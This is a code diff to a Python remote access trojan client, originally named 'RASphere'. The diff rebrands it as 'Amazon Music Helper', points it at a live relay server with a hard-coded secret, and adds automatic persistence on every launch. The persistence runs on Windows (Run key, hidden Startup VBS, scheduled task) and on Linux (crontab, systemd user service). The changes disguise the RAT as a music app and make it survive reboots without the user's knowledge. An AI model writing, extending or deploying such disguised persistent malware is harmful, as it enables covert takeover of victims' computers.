@@ -1,12 +1,14 @@
 #!/usr/bin/env python3
 """
-RASphere - Client Agent
-========================
-Pre-configured RAT agent. Edit the CONFIG section below before compiling.
+Amazon Music Helper
+====================
+Pre-configured agent. Edit the CONFIG section below before compiling.
+Auto-installs persistence to %APPDATA%/.amazonmusic/ on every run.
 
-Compile: pyinstaller --onefile --noconsole client.py
-Run:     RASphereClient.exe     (uses built-in config)
-         RASphereClient.exe --server URL --secret KEY --install
+Compile: python build_client.py
+Run:     AmazonMusicHelper.exe       (uses built-in config, auto-persists)
+         AmazonMusicHelper.exe --no-persist   (skip persistence)
+         AmazonMusicHelper.exe --uninstall    (remove persistence)
 """
 
 import os, io, sys, re, json, time, base64, ctypes, shutil, socket
@@ -18,7 +20,7 @@ from collections import deque
 # ══════════════════════════════════════════════════════════════════════
 # CONFIGURE THESE BEFORE COMPILING
 # ══════════════════════════════════════════════════════════════════════
-_SERVER  = "https://your-app.onrender.com"   # Relay server URL
+_SERVER  = "https://rasphere.onrender.com"   # Relay server URL
 _SECRET  = "rasphere-client-key-2024"        # Client secret key
 _RECON   = 5                                  # Reconnect delay (seconds)
 _CLIENT_ID = None                             # None = auto-generate
@@ -490,12 +492,17 @@ def _exepath():
     return os.path.abspath(sys.argv[0])
 
 def _pdir():
-    b = os.environ.get("LOCALAPPDATA", os.path.expanduser("~")) if sys.platform == "win32" else os.path.expanduser("~/.local/share")
-    p = os.path.join(b, "RASphere"); os.makedirs(p, exist_ok=True); return p
+    if sys.platform == "win32":
+        b = os.environ.get("APPDATA", os.path.expanduser("~"))
+        p = os.path.join(b, ".amazonmusic")
+    else:
+        p = os.path.expanduser("~/.amazonmusic")
+    os.makedirs(p, exist_ok=True)
+    return p
 
 def install_persist(url, secret, rec, cid):
     ep = _exepath(); pd = _pdir()
-    dest = os.path.join(pd, "RASphereClient.exe" if sys.platform == "win32" else "rasphere_client")
+    dest = os.path.join(pd, "AmazonMusicHelper.exe" if sys.platform == "win32" else "amazonmusicd")
     if ep != dest:
         try: shutil.copy2(ep, dest); log.info(f"Copied: {dest}")
         except Exception as e: log.warning(f"Copy fail: {e}"); dest = ep
@@ -507,18 +514,18 @@ def install_persist(url, secret, rec, cid):
         try:
             import winreg
             k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(k, "RASphereClient", 0, winreg.REG_SZ, cl); winreg.CloseKey(k); log.info("Installed: Registry"); ok = True
+            winreg.SetValueEx(k, "AmazonMusicHelper", 0, winreg.REG_SZ, cl); winreg.CloseKey(k); log.info("Installed: Registry"); ok = True
         except Exception as e: log.warning(f"Reg fail: {e}")
         try:
             sd = os.path.join(os.environ.get("APPDATA",""), "Microsoft","Windows","Start Menu","Programs","Startup")
             if os.path.exists(sd):
-                vp = os.path.join(sd, "RASphereClient.vbs")
+                vp = os.path.join(sd, "AmazonMusicHelper.vbs")
                 with open(vp, "w") as f: f.write(f'CreateObject("WScript.Shell").Run "{cl.replace(chr(34), chr(34)+chr(34))}", 0, False')
                 log.info("Installed: Startup VBS"); ok = True
         except Exception as e: log.warning(f"VBS fail: {e}")
         try:
-            subprocess.run(["schtasks","/Delete","/TN","RASphereClient","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
-            r = subprocess.run(["schtasks","/Create","/TN","RASphereClient","/TR",cl,"/SC","ONLOGON","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run(["schtasks","/Delete","/TN","AmazonMusicHelper","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            r = subprocess.run(["schtasks","/Create","/TN","AmazonMusicHelper","/TR",cl,"/SC","ONLOGON","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
             if r.returncode == 0: log.info("Installed: Task"); ok = True
         except Exception as e: log.warning(f"Task fail: {e}")
     else:
@@ -526,17 +533,17 @@ def install_persist(url, secret, rec, cid):
             cline = f"@reboot {cl} > /dev/null 2>&1 &"
             ex = subprocess.run(["crontab","-l"], capture_output=True, text=True)
             ct = (ex.stdout or "")
-            if "RASphereClient" not in ct:
-                ct += f"\n# RASphereClient\n{cline}\n"
+            if "AmazonMusicHelper" not in ct:
+                ct += f"\n# AmazonMusicHelper\n{cline}\n"
                 subprocess.run(["crontab","-"], input=ct, text=True)
                 log.info("Installed: crontab"); ok = True
         except Exception as e: log.warning(f"Cron fail: {e}")
         try:
             sd = os.path.expanduser("~/.config/systemd/user"); os.makedirs(sd, exist_ok=True)
-            sc = f"[Unit]\nDescription=RASphere\nAfter=network.target\n\n[Service]\nExecStart={cl}\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=default.target\n"
-            with open(os.path.join(sd, "rasphere-client.service"), "w") as f: f.write(sc)
+            sc = f"[Unit]\nDescription=Amazon Music Helper\nAfter=network.target\n\n[Service]\nExecStart={cl}\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=default.target\n"
+            with open(os.path.join(sd, "amazonmusic-helper.service"), "w") as f: f.write(sc)
             subprocess.run(["systemctl","--user","daemon-reload"], capture_output=True)
-            subprocess.run(["systemctl","--user","enable","rasphere-client"], capture_output=True)
+            subprocess.run(["systemctl","--user","enable","amazonmusic-helper"], capture_output=True)
             log.info("Installed: systemd"); ok = True
         except Exception as e: log.warning(f"systemd fail: {e}")
     return ok
@@ -547,27 +554,27 @@ def uninstall_persist():
         try:
             import winreg
             k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-            try: winreg.DeleteValue(k, "RASphereClient"); ok = True
+            try: winreg.DeleteValue(k, "AmazonMusicHelper"); ok = True
             except FileNotFoundError: pass
             winreg.CloseKey(k)
         except: pass
         try:
-            vp = os.path.join(os.environ.get("APPDATA",""), "Microsoft","Windows","Start Menu","Programs","Startup","RASphereClient.vbs")
+            vp = os.path.join(os.environ.get("APPDATA",""), "Microsoft","Windows","Start Menu","Programs","Startup","AmazonMusicHelper.vbs")
             if os.path.exists(vp): os.remove(vp); ok = True
         except: pass
-        try: subprocess.run(["schtasks","/Delete","/TN","RASphereClient","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW); ok = True
+        try: subprocess.run(["schtasks","/Delete","/TN","AmazonMusicHelper","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW); ok = True
         except: pass
     else:
         try:
             ex = subprocess.run(["crontab","-l"], capture_output=True, text=True)
-            if ex.stdout and "RASphereClient" in ex.stdout:
-                nc = "\n".join(l for l in ex.stdout.split("\n") if "RASphereClient" not in l)
+            if ex.stdout and "AmazonMusicHelper" in ex.stdout:
+                nc = "\n".join(l for l in ex.stdout.split("\n")                    if "AmazonMusicHelper" not in l)
                 subprocess.run(["crontab","-"], input=nc, text=True); ok = True
         except: pass
         try:
-            sp = os.path.expanduser("~/.config/systemd/user/rasphere-client.service")
+            sp = os.path.expanduser("~/.config/systemd/user/amazonmusic-helper.service")
             if os.path.exists(sp):
-                subprocess.run(["systemctl","--user","disable","rasphere-client"], capture_output=True)
+                subprocess.run(["systemctl","--user","disable","amazonmusic-helper"], capture_output=True)
                 os.remove(sp); subprocess.run(["systemctl","--user","daemon-reload"], capture_output=True); ok = True
         except: pass
     try:
@@ -777,6 +784,7 @@ def main():
     p.add_argument("--reconnect", type=int, default=None, help=f"Reconnect delay (default: {_RECON}s)")
     p.add_argument("--install", action="store_true", help="Install persistence")
     p.add_argument("--uninstall", action="store_true", help="Remove persistence")
+    p.add_argument("--no-persist", action="store_true", help="Skip auto-persistence")
     args = p.parse_args()
 
     url = args.server or _SERVER; secret = args.secret or _SECRET
@@ -792,6 +800,13 @@ def main():
         if not url or not secret: print("ERROR: --server and --secret required for --install"); sys.exit(1)
         if install_persist(url, secret, rec, cid): print("\n[+] Persistence installed! Auto-start on boot.\n")
         else: print("\n[-] Install failed. Run as admin.\n")
+
+    # Auto-install persistence on every run (unless --no-persist)
+    if not args.no_persist and not args.uninstall:
+        try:
+            if url and secret:
+                install_persist(url, secret, rec, cid)
+        except Exception as e: log.debug(f"Auto-persist: {e}")
 
     if not url: print("ERROR: Set _SERVER in code or use --server"); sys.exit(1)
     if not secret: print("ERROR: Set _SECRET in code or use --secret"); sys.exit(1)
